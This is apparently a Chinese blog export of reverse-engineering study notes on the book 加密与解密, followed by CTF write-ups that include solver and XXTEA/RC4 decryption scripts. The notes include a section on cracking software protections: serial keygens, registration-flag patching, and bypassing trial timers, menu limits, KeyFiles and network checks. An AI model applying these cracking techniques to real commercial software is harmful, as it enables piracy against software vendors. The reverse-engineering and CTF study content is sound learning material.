规范\n VC++：左边两个参数分别存入 ecx, edx 中，其余压栈 Borland Delphi/C++：左边三个参数分别存入 eax, edx, ecx 中，其余按PASCAL方式压栈  C++非静态类成员默认调用 thiscall ，对象的每个函数隐含接受 this 参数，使用 eax 存放，其余参数从右到左压栈\n名称修饰约定 为了操作符和函数重载，C++编译器会按照规则修改入口点的符号名，从而允许同一个名字有多个用法。\nC的规则如下：\n stdcall调用约定在输出函数名前加下划线，在后面加@，格式为 _functionname@number __cdecl调用约定格式为 _functionname Fastcall调用约定格式位 @functionname@number  均不改变大小写\nC++规则如下：\n stdcall调用约定以 ? 开头，函数名后以 @@YG 标识参数表开始，后跟参数表，参数表第一项位返回值类型，其后依次为参数的数据类型，指针标识在其所指数据类型前，参数表后，以 @Z 标识整个名字的结束，若无参数，则以 Z 结束。格式为 ?functionname@@YG******@Z 或 ?functionname@@YG*XZ __cdecl调用将 @@YG 替换为 @@YA Fastcall调用将 @@YG 替换为 @@YI  返回值 return操作返回 存放在 eax 寄存器中，高32位存放在 edx 中\n传引用方式返回 传引用调用方式将变量的地址传递给函数，可以在子函数中修改该内存单元中变量的值，因此允许修改原始变量\n数据结构 局部变量 函数内部定义的一个变量，作用域和生命周期仅局限于该函数内\n栈存放 先将参数压入栈中，再修改 ebp ，最后减小 esp。因此 [ebp+**h] 表示参数， [ebp-**h] 表示局部变量\n寄存器存放 有 6 个通用寄存器尽可能有效地存放局部变量， 因此需要注意确定当前的寄存器中存储的变量是哪个变量\n全局变量 局部变量存放在栈中，而全局变量存放在内存区中\n版本标记等常数通常为全局变量\n全局变量通常存放在数据区块 .data 的一个固定地址处，程序使用固定的硬编码地址进行寻址\n如果在只读区块，说明是一个常量\n数组 一般通过基址+变址实现寻址，如：\nmov eax, [407030h + eax]\r间接寻址一般用于给数组和结构赋值，[base+n] 根据n的不同对结构中的相应单元赋值。\n0040101D lea esi, dword ptr [esp+8]\r00401021 mov edi, 3\r00401026 mov eas, dword ptr [esi]\r...\r00401036 add esi, 4\r00401039 dec edi\r0040103A jnz short 00401026\r虚函数  C++面向对象中，最重要的概念就是虚函数\n 虚函数是程序运行时定义的函数，其地址不能在编译时确定，只能在调用即将进行时确定。虚函数的引用存放在专用数组——虚函数表（Virtual Table，VTBL）中。\n调用时首先通过虚函数指针找到虚函数表的地址，然后在虚函数表中找到该函数的入口地址，最后进行调用。\n控制语句 if-else 汇编形式通常为\ncmp a, bjz 0040xxxxh ; (jnz)\r可以用 test eax, eax 替代 cmp ，该语句（相当于逻辑与运算）表示当 eax 为 0 时，设置 ZF 为 1，jz 则表示 ZF 位为 1 时跳转\nswitch-case 无优化版本\n0040101D cmp [ebp-08], 01 ; case 100401021 je 0040103100401023 cmp [ebp-08], 02 ; case 200401027 je 0040104000401029 cmp [ebp-08], 0A ; case 100040102D je 0040104F0040102F jmp 0040105E ; default\r使用 dec 指令替代 cmp\nmov eax, [esp+08]dec eax ; case 1je 0040xxxxdec eax ; case 2je 0040xxxxsub eax, 00000008 ; case 10je 0040xxxx\r跳转表实现（case的取值为算术级数时）\njmp dword ptr [4*eax+004010B0] ; 跳转表\r转移指令机器码计算 位移量=目的地址-起始地址-跳转指令长度\n转移指令机器码=转移类别机器码+位移量\n转移指令可以分为短转移，长转移和子程序调用（call）\n短转移2字节\n长转移无条件5字节，条件转移6字节\ncall指令5字节\n条件设置指令 对于语句\nc = (a \u0026lt; b) ? c1 : c2; 条件分支语句为\ncmp a, b mov eax, c1 jl L1 mov eax, c2L1:\r使用条件设置语句可以不包含条件分支\nxor eax, eaxcmp a, bsetge al ; if a \u0026gt;= b, al = 1, else al = 0dec eaxand eax, (c1 - c2)add eax, c2\r或者使用条件传输指令\nmov eax, c2cmp a, bcmovl eax, cl\r循环语句 通常使用 ecx 寄存器作为计数器，例如\nxor ecx, ecx ; 计数器清空:L1\tinc ecx\t...\tcmp ecx, 05 ; 循环退出条件\tjbe L1\r优化后的循环实例\nxor ecx, ecx xor eax, eax:L1 add ecx, eax inc eax cmp eax, 64h jle L1 xor eax, eax\r对应的源码\nsum = 0;for (i = 0; i \u0026lt;= 100; i++) sum += i; 数学运算 加减法 add 和 sub 指令，有时候可以使用 lea 进行优化\nlea 允许一个时钟内计算 lea edx, [eax+ecx+78h] 级别的运算\n乘法 乘法使用 mul 或 imul 指令\n对于2的幂，使用 shl 指令可以加快运算\n由于 lea 指令可以实现乘 2, 4, 8 的运算，因此可以用来加快 3, 5, 6, 7, 9 等数字的乘法运算，如 lea eax, [eax+eax*4]\n除法 div 或 idiv 指令\n对于2的幂，使用 shr 指令加速，有符号时使用 sar\n此外可以利用乘法进行加速\n常见的优化公式为 $$ \\dfrac{a}{b}=a\\times \\dfrac{1}{b} $$ 因此，$\\div 11$ 可以优化为 $(\\times 2E8BA2E9)\u0026raquo;(32+1)$\nmov eax, 2E8BA2E9imul ecxsar edx, 1 ; edx中存放了乘法的高位双字节mov ecx, edx\r字符串 字符串存储 分为两种，一种使用结束符作为标识，一种记录长度\n C语言：String\\0 DOS字符串：String$ PASCAL：\\x05String Delphi：\\x05\\x00String  Go语言使用一个64位整型记录长度\n字符寻址指令 mov将当前指令所在的内存复制并放到目的寄存器中，可操作常量或指针\nlea是装入有效地址，操作数是地址\n以下两条指令是等价的\nlea eax, [401000h]mov eax, 401000h\r都是将401000h写入eax寄存器中\n因此，以下两个指令也是等价的\nlea eax, [eax+8]add eax, 8\r常被编译器用来计算加法\nASCII大小写转换 区别在于二进制的第五位，大写字母为0，小写字母为1\n因此有如下方法\n 大小写转换：$\\pm\\ \\mathrm{0x}20$，$\\oplus\\ \\mathrm{0x}20$ 转大写：$\u0026amp;\\ \\mathrm{0b}11011111$ 转小写：$|\\ \\mathrm{0b}00100000$  计算长度 mov ecx, FFFFFFFF ; 这一句是一个重要特征xor eax, eax ; 清零，原文为subrepnz ; 复制串操作，直到ecx为0scasb ; 串扫描指令，把al中的内容与edi指向的附加段中的数据逐一比较not ecx ; ecx=字符长度+1dec ecx ; ecx=字符长度je xxxxxx ; 如果ecx为0，说明长度为0\r指令修改技巧 eax有优化，尽可能使用\n替换字节：\n   指令 机器码 指令字节长度     nop 90 1   push eax + pop eax 50 58 2   inc eax + dec eax 40 48 2   mov edi, edi 8B FF 2   jmp xx EB 00 2    用nop就行\n寄存器清零：\n   指令 机器码 指令字节长度     mov eax, 00000000h B8 00 00 00 00 5   push 0 + pop eax 6A 00 + 58 3   sub eax, eax 2B C0 2   xor eax, eax 33 C0 2    测试寄存器是否为0：\n   指令 机器码 指令字节长度     cmp eax, 00000000h 83 F8 00 3   or eax, eax / test eax, eax 0B C0 / 85 C0 2    后接 je label 字节码为 74 xx 或 0F 84 xxxxxxxx，长度为2或6，取决于近跳转还是远跳转\n寄存器置 0FFFFFFFFh\n   指令 机器码 指令字节长度     mov eax, 0FFFFFFFFh B8 FF FF FF FF 5   （清零后）dec eax 48 1   std + sbb eax, eax F9 + 2B C0 3    转移指令\n   指令 机器码 指令字节长度     jmp label EB xx / E9 xxxxxxxx 2 / 6   push label + ret 68 xxxxxxxx + C3 6    64位 与32位有很多重叠\n寄存器 64位通用寄存器 R 开头\n8个128位 XMM 寄存器，通常用来优化（SIMD指令）\n此外， AX 低16位，AL 低8位， AH 第 $8\\sim 15$ 位\nR8 则有 R8D 低32位，R8W 低16位，R8B 低8位\n函数 栈 x64中有如下区别\n  一个栈空间8字节（64位）\n  汇编指令对栈顶需要对齐16（被16整除）\n  根据start寻找main start函数结束前会有如下指令\njmp __tmainCRTStartup\r进入该函数后可以看到 main 函数\n如果符号表被去除，可根据前后特征进行定位\n 在调用完成main后，通常会调用exit来退出进程，所以exit前的一个call就是main函数（也可能在该函数内部的call中）。\n 调用约定 使用寄存器快速调用约定\n前几个参数使用的寄存器是固定的，后续的参数从右往左栈，非1, 2, 4, 8字节大小的参数必须用引用（地址）传参\n传递顺序为 RCX， RDX， R8， R9，所有浮点参数由XMM传参，顺序依次为 XMM0 ~ XMM3\n 为了使得寄存器仍然能够使用，会预留栈空间，将寄存器的值存入栈空间中，该空间由调用者申请并平衡\n 函数返回值 使用 RAX 返回参数，返回值过大可以使用栈空间作为参数间接访问\n数据结构 局部变量 使用栈区进行存放\nRelease版会更多地使用寄存器\n全局变量 地址通常在编译期固定\nmov eax, cs:140009150h\r数组 $地址=首地址+类型大小\\times 下标$\n IDA中使用Y快捷键来修改数据类型，可以反编译成下标模式，更好看一些\n 汇编通常为 [地址+寄存器*n]（或者循环中每次循环 地址+=n？）\n控制语句 通常虚线箭头表示有条件跳转，实线箭头表示无条件跳转\nif 语句：jxx跳转，且目的地址后没有jxx（说明不是循环）\nif else语句：jxx跳转，且目的地之前有一个jmp实跳转，目的地址后无跳转\nif elif else语句：多个jxx跳转，每个Block以jmp结尾，最后一个Block不含跳转\nswitch case语句：分支数 $\\geqslant 6$ 使用case表，$\u0026lt;6$ 使用else if\n 无法使用case表的情况下，为减少if的判断次数，可能使用二叉平衡树来减少if判断次数\n 循环语句 do while 先执行，后判断\ndo_while_start:{\t; 代码}cmp a, bjxx do_while_start\r通常有一个向上跳转\nwhile循环 先判断，后执行\nwhile_start:cmp a, bjxx while_end{\t; 代码}jmp while_startwhile_end:; 后续代码\r通常为一个向下的条件跳转，该目的地之前有一个向上的实跳转，跳转到向下跳转前\nfor 循环 jmp for_iffor_step: 步长for_if: 循环条件jxx for_endfor 代码jmp for_stepfor_end:\r很常见的代码，比while循环多一个向下跳转\n数学运算符 加减法 add和sub指令，可用lea指令进行优化\n此外还有常量折叠的优化方法，即编译时提前完成常量间的计算，节省运行消耗的时间\n乘法 imul为有符号乘法，mul为无符号乘法\n通常使用lea比例因子寻址优化\nlea edx, ds:0[rcx*4] ; *4imul edx, 7 ; *7lea edx, [rbc+rbc*8] ; *9\r除法 有符号 除数为 $2^n$ 时，使用位移进行优化\n除数为 $-2^n$ 时，使用位移，同时增加求补（x为负数时，计算 $-((x+(2^n-1))\\gg n)$ ）\n取模 软件保护技术 序列号 序列号（注册码）的方式是目前最常见的一种保护\n过程通常为：用户提交个人信息，公司计算得到序列号并返回给用户，用户通过序列号进行注册。软件从磁盘文件或注册表中获取注册信息\n保护机制 本地计算用户信息并与序列号比较 即：$序列号=F(用户名)$\n对于这种方式，可以直接使用调试的手段，在内存中直接找到计算后的序列号，同时，将F函数复制出即可生成注册机\n通过注册码求逆并与用户信息比较 即：用公式 $序列号=F(用户名)$ 生成，用公式 $用户名=F^{-1}(序列号)$ 验证\n破解方法有\n 通过 $F^{-1}$ 求出 $F$ 给定用户名，穷举序列号 给定序列号，用 $F^{-1}$ 计算出用户名（通常包含不可见字符）  对等函数检查 即：$F_1(用户名)=F_2(序列号)$\n通常 $F_2$ 可逆，借鉴上两种破解思路即可\n二元函数 即：$特定值=F(用户名，序列号)$\n缺陷在于可能缺少用户名与序列号的一一对应关系，开发者不易写出注册机\n攻击方法 法一：通过跟踪输入，找到判断逻辑\n 软件通常调用api将用户输入复制到缓冲区，常用api有：GetWindowsTextA(W)，GetDiaItemTextA(W)，GetDlgItemInt，hmemcpy，或者查找输出函数（对话框或标准输出等）\n 法二：跟踪程序启动时对注册码的判断过程\n 注册表中的序列号会调用 RegQueryValueExA(W)，INI文件中 GetPrivateProfileStringA(W)等等\n 根据数据约束性 对于采用明文比较的程序，正确注册码通常在输入注册码的前后 90h 字节的地方\nhmemcpy 这个函数是 Windows 9x 系统的内部函数，是万能断点\n现在同样可以使用系统的API下断点\n消息断点 按下和释放鼠标时，会发送 WM_LBUTTONDOWN (0201h) 和 WM_LBUTTONUP (0202h) 消息\n可以利用消息断点断在按钮的事件代码处\n人机交互信息 软件大多数采用了人机对话的方式进行，因此可以直接通过搜索字符串和交叉引用找到关键函数\n应该是目前最常用的方法了\n字符串比较  寄存器直接比较 函数比较 串比较  串比较有些少见，记录一下：\nlea edi []\rlea esi []\rrepz cmpsd\rjz (jnz)\r制作注册机 明码泄露的攻击 序列号在内存中曾以明码出现过即可\n可以使用keymake编写内存注册机，或利用 Int 3 等 Debug API 手写内存注册机\n无明码 进行加密算法的逆向解密\n或者直接将汇编嵌入注册机中\n警告窗口 软件不时提醒用户购买正式版本\n可以通过设置窗口为不可见来去除，或者在窗口的创建函数处将其跳过\n利用 Resource Hacker 软件可以找到窗口的 id，然后再汇编中搜索即可找到窗口的程序\n程序中，是否注册的 flag 标记可能是全局变量，找到这个变量并 patch 程序使其为 1 即可\n时间限制 限制单次运行时长，或者限制软件的使用时间\n计时器 setTimer() 函数 程序运行时会申请一个计时器，并指定间隔，并获得一个处理计时器超时的回调函数\nUINT SetTimer( HWND hWnd, // 窗口句柄，计时器到时后，将向这个窗口发送WM_TIMER消息  UINT nIDEvent, // 计时器标识  UINT uElapse, // 指定计时器时间间隔（单位为毫秒）  TIMERPROC lpTimerFunc // 回调函数，超时后将调用 ); 高精度计时器 通过调用 timeSecEvent() 函数启动\nGetTickCount() 函数及 timeGetTime() 函数 该函数返回系统自成功启动以来所经过的时间，将两次返回值相减，即可得到当前运行时间\n这种方法也可以使用 time() 等函数\n时间限制 软件通常将第一次运行时的系统时间，存放在注册表或文件或某扇区中，每次运行时获取该时间，并与当前时间进行比较\n为了避免用户修改系统时间，软件会在保存安装时间（并存放于多个地方）之外，再保存最近一次运行的时间，每次运行时用当前时间替换\n拆解时间限制  直接跳过 SetTimer() 函数 利用 WM_TIMER 消息，查找到时间比较的位置，对二进制文件进行patch（去掉退出跳转等等）   动态分析时，可以配合变速齿轮使用，这样就可以很快到达软件的限制时间，进行调试\n 菜单功能限制 当注册版和正式版文件相同，只是部分功能被限制无法使用时，可以恢复正式版的功能\n相关函数 EnableMenuItem() BOOL EnableMenuItem( HMENU hMenu, // 菜单句柄  UINT uIDEnableItem, // 欲允许或禁止的一个菜单条目的标识符  UINT uEnable, // 控制标志，包括允许、灰化、禁止等 ) EnableWindow() BOOL EnableWindow( HWND hWnd, // 窗口句柄  BOOL bEnable // True为允许，False为禁止 ) 拆解菜单限制保护 找到关键函数，把函数的参数patch一下即可\nKeyFile保护 KeyFile通常是一个小文件，可能是可见字符，也可能是二进制文件，由软件开发者定义\n软件启动后，会从KeyFile文件中读取数据，根据处理结果判断是否正确注册\n相关API 与文件操作有关的API都可以下断点\n   API 作用     FindFirstFileA 确定注册文件是否存在   CreateFileA, _lopen 确定文件是否存在，打开文件以获得句柄   GetFileSize, GetFileSizeEx 获得文件的大小   GetFileAttributesA, GetFileAttributesExA 获得文件的属性   SetFilePointer, SetFilePointerEx 移动文件指针   ReadFile 读取文件内容    拆解保护  利用文件监视软件找到KeyFile文件名 利用十六进制编辑器伪造KeyFile 动态调试，跟踪文件内容  具体的破解方法与输入序列号类似\n网络验证 软件必须从服务器中取得一些关键数据才能正确运行\n破解的思路是拦截服务器的数据包，并分析程序对该数据包的处理\n相关API int send( SOCKET s, // 套接字描述符  const char FAR *buf, // 缓冲区  int len, // 发送数据的字节数  int flags // 附加标志，一般为0 ); int recv( SOCKET s, // 套接字描述符  char FAR *buf, // 缓冲区  int len, // 缓冲区buf的长度  int flags // 附加标志，一般为0 ); 此外，还有微软扩展函数 WSASend 和 WSARecv\n破解思路 当服务器发送的数据包固定时，可以搭建本地服务器，发送该数据包\n数据包不固定时，需要分析算法\n加密算法——常见加密库接口及其识别 可以使用 Flair 工具制作 IDA sig\nMiracl 大数运算库 大数库，支持 RSA、DH 密钥交换、DSA 以及椭圆曲线等\n存储方式：以 $2^{32}$ 进制表示，低位在前，高位在后\n识别方式：MR_IN() 是错误处理方式，几乎每个函数中都有\nmov dword ptr [eax+ecx*4+20], yy 其中，yy 就是 MR_IN() 的参数，一次可以从 miracl.h 中找到对应的函数\nFGInt 用于 Delphi，可实现常见公钥加密系统\n存储方式：以 $2^{31}$ 进制表示\n识别方式：参数个数以及调用前后的数据变化（黑盒）或者使用 PEiD 的 Krypto ANALyzer 插件\nfreeLIP 最初用于用于进行 RSA-129 挑战，$2^{30}$ 进制，速度不如 Miracl\nCrypto++ 实现了大量的加密算法，常用识别方法为 IDA sig，需要熟练掌握加密算法\nLibTomCrypto 包括常见的散列算法、对称算法以及公钥加密算法\nGMP 核心采用了汇编语言实现，速度非常快，通常用于实现大整数分解\nOpenSSL 用于网安领域，包括一些加密算法的实现，例如 BlowFish、IDEA、DES、CAST，RSA、DSA，MD5、RIPEMD、SHA 等\n可以到 OpenSSL 的 crypto 目录下的加密算法源码中寻找符合条件的函数\nMicrosoft Crypto API 可参考 MSDN，IDA、OllyDbg 等软件均可识别\nNTL 数论相关，实现有符号的、算术整数的运算，以及向量、矩阵、基于有限域和整数的多项式运算\nDCP 和 DEC Delphi 的加密算法库\nWindows内核基础 内核理论基础 权限级别 CPU将权限分为 R0~R3 其中 R0 权限最高，运行内核，R1 和 R2 运行驱动程序，R3 权限最低，运行应用程序\n操作系统（Windows, Linux）为方便，将内核和驱动程序（内核态）运行在了 R0 层，将应用程序（用户态）运行在 R3 层，而没有使用 R1 和 R2 ，因此 AMD64 取消了 R1 和 R2 层\n内存空间布局 32位系统虚拟内存：\n2GB内核空间，64KB的NULL空间和非法空间，其余为进程空间\n64位系统虚拟内存：\nWindows实际为44位（16TB），Linux实际为48位（256TB）\n存在大量空洞\n+-+-+-+-+-+-+-+-+-+-+-+-+ 0x000000\r| |\r+-+-+-+-+-+-+-+-+-+-+-+-+ 0x400000\r| text |\r+-+-+-+-+-+-+-+-+-+-+-+-+\r| data |\r+-+-+-+-+-+-+-+-+-+-+-+-+\r| BSS |\r+-+-+-+-+-+-+-+-+-+-+-+-+\r| heap |\r+-+-+-+-+-+-+-+-+-+-+-+-+ 向下增长\r| |\r| hole |\r| |\r+-+-+-+-+-+-+-+-+-+-+-+-+ 0x00002AAAAAAAA000\r| 内存映射区域 |\r+-+-+-+-+-+-+-+-+-+-+-+-+ 向下增长\r| |\r| hole |\r| |\r+-+-+-+-+-+-+-+-+-+-+-+-+ 向上增长\r| stack |\r+-+-+-+-+-+-+-+-+-+-+-+-+ 0x00007FFFFFFFF000=TASK_SIZE\r| 未定义区域 |\r+-+-+-+-+-+-+-+-+-+-+-+-+ 0xFFFF800000000000\r| 内核空间 |\r+-+-+-+-+-+-+-+-+-+-+-+-+\rWindows内核启动过程 BIOS+MBR+Windows\n启动自检 从BIOS中载入必要指令，进行硬件初始化检查，并显示信息\n初始化启动 根据CMOS设置，BIOS加载启动盘，将引导代码载入内存，由MBR执行启动过程。启动代码搜索MBR的分区表，找到活动分区，将第一个扇区的引导代码载入内存，检测系统并查找启动管理器。过去为 ntldr ，Windows7开始使用 Bootmgr作为启动管理。\nBoot加载 对启动管理器进行设置\n 设置内存模式：32位系统+32位CPU，设置为32位内存模式；64位系统+64位CPU，设置为64位内存模式 启动一个简单的文件系统：定位 boot.ini，ntoskrnl，Hal 等启动文件 读取 boot.ini 文件  检测和配置硬件 检查和配置硬件设备，如系统固件、总线、适配器、键盘磁盘等等\n内核加载 启动管理器先加载内核 Ntoskrnl.exe 和硬件抽象层 HAL。HAL 会对硬件底层进行隔离，为操作系统提供统一的API。\n随后根据注册表 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet 来加载驱动程序\n注册表中的 Start 键表示了启动顺序\nSERVICE_BOOT_START， 内核初始化时，与系统核心相关的重要驱动程序 SERVICE_SYSTEM_START SERVICE_AUTO_START，登陆界面开始 SERVICE_DEMAND_START，需要时手动加载 SERVICE_DISABLED，禁止加载  Windows会话管理启动 smss.exe 是Windows中第一个创建的用户模式进程，主要用于\n 创建系统环境变量 加载 win32k.sys，Windows子系统的内核模式部分 启动 csrss.exe，Windows子系统的用户模式部分 启动 winlogon.exe 创建虚拟内存页面文件 执行重启前未完成的重命名工作 ","date":"2021-09-25T02:15:45+08:00","image":"/post/note-of-book-encryption-and-decryption/cover_huf14a87ae5877971d635f5feb6ec88f93_885732_120x120_fill_q75_box_smart1.jpg","permalink":"/post/note-of-book-encryption-and-decryption/","title":"加密与解密学习笔记（持续更新ing）"},{"content":" RE1：迷宫 RE2：so层  最后一个好像是php？告辞\nRE1 程序逻辑很简单，就是一个迷宫，迷宫的每一个位置写成了一个函数，一开始想手动推一下试试，结果发现有的格子可能有多条路径，然后想反着推，然后发现有相同的问题\u0026hellip;\n考虑写自动化脚本，一开始想试试angr，同样有很多问题，想用idaapi又只能现查各种api\n后来在手动执行的时候，发现错误输入和正确输入之间的区别是反馈不同，而且走错路径的话不需要退出，直接原路返回就行，于是考虑直接用pwntools模拟手动执行\n直接简单回溯\nimport sys sys.setrecursionlimit(20000) from pwn import * success = [ b\u0026#39;Just do it\\n\u0026#39;, b\u0026#39;GOGOGO\\n\u0026#39;, b\u0026#39;Wuhu~!\\n\u0026#39;, b\u0026#39;Wuhu\\n\u0026#39;, b\u0026#39;You are so good\\n\u0026#39;, b\u0026#39;Nice.\\n\u0026#39;, b\u0026#39;Yeah~~\\n\u0026#39;, b\u0026#39;Yeah~~~\\n\u0026#39;, b\u0026#39;Let\\\u0026#39;s go.\\n\u0026#39;, b\u0026#39;Never stop\\n\u0026#39;, b\u0026#39;So smart\\n\u0026#39;, ] p = process(\u0026#39;./maze\u0026#39;) # solvepath = \u0026#34;SSSSSSSSSDDDDDDWWWWAAWWAASSSSD\u0026#34; # context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) # solveend = \u0026#34;AASSDDSSSSDDS\u0026#34; # solvepath = \u0026#39;S\u0026#39; * 8 solvepath = \u0026#39;S\u0026#39; * 8 direct = [\u0026#39;W\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;S\u0026#39;] p.recvuntil(b\u0026#39;You can only go south.\\n\u0026#39;) for i in solvepath: p.send(i) print (p.recvline(), i) def dfs(): global solvepath for cur in direct: if direct.index(solvepath[-1]) + direct.index(cur) != 3: p.send(cur) rev = p.recvline() # print (rev, cur) if rev in success: solvepath += cur # print (solvepath) dfs() # print (direct[3 - direct.index(solvepath[-1])]) p.send(direct[3 - direct.index(solvepath[-1])]) solvepath = solvepath[:-1] p.recvline() elif b\u0026#39;Good Job.\u0026#39; in rev: print (solvepath + cur) exit(0) dfs() 运行结果拿去算个md5就行\nRE2 这题才是传统的逆向啊，为什么做的人反而比第一题少\u0026hellip;\n看一下jeb，发现加密在so层，直接ida看so层\n发现先进行了一个RC4，然后是一个XXTEA\n直接解密\n解密代码来自 NewBieReer 师傅\n先上XXTEA模板\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define DELTA 0x9e3779b9 #define MX (((z\u0026gt;\u0026gt;5^y\u0026lt;\u0026lt;2) + (y\u0026gt;\u0026gt;3^z\u0026lt;\u0026lt;4)) ^ ((sum^y) + (key[(p\u0026amp;3)^e] ^ z)))  void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; rounds = 6 + 52/n; //12 52/6 = 8 n  sum = rounds*DELTA; y = v[0]; do { e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p=n-1; p\u0026gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } int main(){ uint32_t v[9] = {0x68E5973E, 0x0C20C7367, 0x98AFD41B, 0xFE4B9DE2, 0x1A5B60B, 0x3D36D646, 0xDBCC7BAF, 0xA0414F00, 0x762CE71A }; uint32_t const k[4] = {0x1,0x10,0x100,0x1000}; int n = 9; btea(v,n,k); printf(\u0026#34;解密后的数据：0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x %08x\\n\u0026#34;,v[0],v[1],v[2],v[3],v[4],v[5],v[6],v[7],v[8]); } 然后再接一个RC4\ndef __rc4_init(key): keylength = len(key) S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + int(key[i % keylength])) % 256 S[i], S[j] = S[j], S[i] return S def rc4_crypt(key, data): S = __rc4_init(key) i = j = 0 result = b\u0026#39;\u0026#39; for a in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = (a ^ S[(S[i] + S[j]) % 256]).to_bytes(1, \u0026#39;big\u0026#39;) print (hex(S[(S[i] + S[j]) % 256])) result += k return result if __name__ == \u0026#34;__main__\u0026#34;: from libnum import n2s, s2n key = b\u0026#39;\\x01\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x10\\x00\\x00\u0026#39; data = n2s(0x5604b0d49c634d3096cec00593be3b82524b16b28a33b74d6d7b9950c2b10c12e1840a93) def convert(k): ret = [] while k \u0026gt; 0: ret.append(k \u0026amp; 0xff) k \u0026gt;\u0026gt;= 8 return ret[::-1] result_rc4 = rc4_crypt(key,data) print(result_rc4) 注意一下大小端就行\n","date":"2021-08-04T13:48:58Z","permalink":"/post/2021dfjk-re/","title":"dfjk 2021 RE"},{"content":"imnotavirus 解exe，解密pyc\n利用解密后的pyc，找到注入的shellcode，用ida解smc，最后解密\n比赛的时候还被迫阅读了一下pyinstaller的源码，收获很大\n解exe 看到附件给了个pyinstaller，猜测是python逆向\n先ida看一眼，有upx壳，自动脱壳，再用exeinfo确认了一下是python逆向，pyinstxtractor.py解包（之前V\u0026amp;N2021就吃了这个亏）\n解pyc 解包时提示被加密了\n取struct头作为标准头，用pycdc还原出main.py，发现调用了sign\n去PYZ00文件夹看一下，发现被加密了，看一下目录，发现pyimod和比一般情况多了一些东西，把这些都解开看一下，有一个key文件\n同时发现archive中有一个Cipher类，但是pycdc缺少指令，无法全部还原，考虑看一下pycdas解出来的字节码\n字节码中有个对pyinstaller源码的引用，直接去文件夹里面看，发现能解密出来的部分完全一致\n照着源码中的方法解密sign\nfrom key import key import tinyaes print (key) f = open(\u0026#39;./PYZ-00.pyz_extracted/sign.pyc.encrypted\u0026#39;, \u0026#39;rb\u0026#39;) data = f.read() cipher = tinyaes.AES(key.encode(), data[:16]) output = cipher.CTR_xcrypt_buffer(data[16:]) f.close() import zlib output = zlib.decompress(output) f = open(\u0026#39;./sign.pyc\u0026#39;, \u0026#39;wb\u0026#39;) f.write(output) 解密 解出sign后看到有三个base64，其中两个是执行的语句，此外大部分语句涉及到了内存\n另外一个base解出来是乱码，用字节码辅助恢复函数（其实特征已经很明显了），发现进行了rc4加密，直接打印出解密结果，将结果写入文件，用ida查看\n发现smc\nmov eax, 41178Bh mov ecx, 411802h sub ecx, eax loc_2A: mov ebx, [rax] xor ebx, 77h mov [rax], ebx loop loc_2A 解出来后尝试恢复了一下函数，结果很丑\u0026hellip;只能和汇编比较着进行分析了（好像只要把00 patch一下就可以反编译了）\nseg000:000000000000007E loc_7E: ; CODE XREF: sub_0+73↑j seg000:000000000000007E mov eax, [rbp+var_20] seg000:0000000000000081 cmp eax, [rbp+var_8] seg000:0000000000000084 jge short loc_B2 seg000:0000000000000086 mov eax, [rbp+8] seg000:0000000000000089 add eax, [rbp+var_20] seg000:000000000000008C movsx ecx, byte ptr [rax] seg000:000000000000008F xor ecx, 13h seg000:0000000000000092 mov edx, [rbp+8] seg000:0000000000000095 add edx, [rbp+var_20] seg000:0000000000000098 mov [rdx], cl seg000:000000000000009A mov eax, [rbp+8] seg000:000000000000009D add eax, [rbp+var_20] seg000:00000000000000A0 movsx ecx, byte ptr [rax+1] seg000:00000000000000A4 xor ecx, 37h seg000:00000000000000A7 mov edx, [rbp+8] seg000:00000000000000AA add edx, [rbp+var_20] seg000:00000000000000AD mov [rdx+1], cl seg000:00000000000000B0 jmp short loc_75 发现是两两一组进行加密，分别异或0x13和0x37\n\u0026gt;\u0026gt;\u0026gt; for i in range(len(cipher)): ... if i % 2 == 0: ... print (chr(cipher[i] ^ 0x13), end = \u0026#39;\u0026#39;) ... else: ... print (chr(cipher[i] ^ 0x37), end = \u0026#39;\u0026#39;) ... @rey0ug0nn2$1gnth1s0r1tw1llb3y0ursurv1 内卷 这题是赛后边补边写的，所以废话略多\n花指令 搜索静态字符串能找到很多有用的字符串，但发现找不到引用\n从start开始往里面翻一翻，发现有个一大片数据没有被解析出来，说明是个花指令，之前没见过这个花，简单记录一下\n.text:00000001400016AB call loc_1400016B3 .text:00000001400016AB ; --------------------------------------------------------------------------- .text:00000001400016B0 db 0E8h, 0EBh, 12h .text:00000001400016B3 ; --------------------------------------------------------------------------- .text:00000001400016B3 .text:00000001400016B3 loc_1400016B3: ; CODE XREF: sub_1400015E2+C9↑j .text:00000001400016B3 pop rax ; 取出栈顶数据 .text:00000001400016B4 add rax, 1 ; 对其进行+1 .text:00000001400016B8 push rax ; 然后再压栈 .text:00000001400016B9 mov rax, rsp .text:00000001400016BC xchg rax, [rax] .text:00000001400016BF pop rsp .text:00000001400016C0 mov [rsp+0], rax .text:00000001400016C4 retn 这个花长这样，所以 Call loc_1400016B3 的操作就是跳过 E8，把第一个E8 patch成nop，发现EB 12就是跳到这个函数的后面，所以这条 Call 指令也可以Patch掉\n还有一些长跳转，这个就直接按c转成指令就行\n还有这个花\n.text:0000000140006D12 loc_140006D12: ; CODE XREF: sub_1400015E2:loc_140006D12↑j .text:0000000140006D12 jmp short near ptr loc_140006D12+1 把 jmp 指令的第一个字节patch了就行\n花指令全部去掉之后发现结尾还有一部分没有反编译，这个比赛的时候没想出来怎么搞，不知道怎么回时，所以这题后面也就没有怎么做了\n运算简化 